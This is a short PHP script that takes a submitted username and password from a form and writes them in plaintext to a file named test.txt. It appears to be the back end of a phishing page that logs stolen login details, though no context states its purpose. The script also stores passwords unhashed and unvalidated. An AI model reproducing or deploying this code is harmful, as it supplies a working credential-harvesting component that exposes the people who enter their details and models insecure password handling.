<?php
$data_file=fopen("test.txt","w");
$username=$_POST["username"];
$password=$_POST["password"];
$text_to_write=$username." ".$password;
fwrite($data_file, $text_to_write);
fclose($data_file);
?>